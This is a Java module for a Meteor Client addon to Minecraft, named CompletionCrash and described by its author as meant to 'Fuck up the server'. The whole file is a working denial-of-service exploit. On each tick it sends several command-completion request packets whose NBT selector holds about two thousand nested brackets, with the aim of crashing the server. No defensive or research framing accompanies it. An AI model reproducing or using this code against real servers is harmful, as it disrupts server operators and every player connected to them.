package dev.abstr3act.addon.modules.Abnormally;

import dev.abstr3act.addon.Compassion;
import dev.abstr3act.addon.module.AbnormallyModule;
import meteordevelopment.meteorclient.events.world.TickEvent.Post;
import meteordevelopment.meteorclient.settings.IntSetting.Builder;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.client.MinecraftClient;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CompletionCrash extends AbnormallyModule {
    private final SettingGroup sgGeneral = this.settings.createGroup("Rate");
    private final Setting<Integer> packets = this.sgGeneral
        .add(
            ((Builder) ((Builder) ((Builder) new Builder().name("Packets per tick")).description("Amount of packets sent each tick")).defaultValue(3))
                .min(2)
                .sliderMax(12)
                .build()
        );
    private int length = 2032;

    public CompletionCrash() {
        super(Compassion.ABNORMALLY, "CompletionCrash", "Fuck up the server");
    }

    @EventHandler
    private void onTick(Post event) {
        String overflow = this.generateJsonObject(this.length);
        String message = "msg @a[nbt={PAYLOAD}]";
        String partialCommand = message.replace("{PAYLOAD}", overflow);

        for (int i = 0; i < this.packets.get(); i++) {
            MinecraftClient.getInstance().player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, partialCommand));
        }

        this.toggle();
    }

    private String generateJsonObject(int levels) {
        String in = IntStream.range(0, levels).mapToObj(i -> "[").collect(Collectors.joining());
        return "{a:" + in + "}";
    }
}
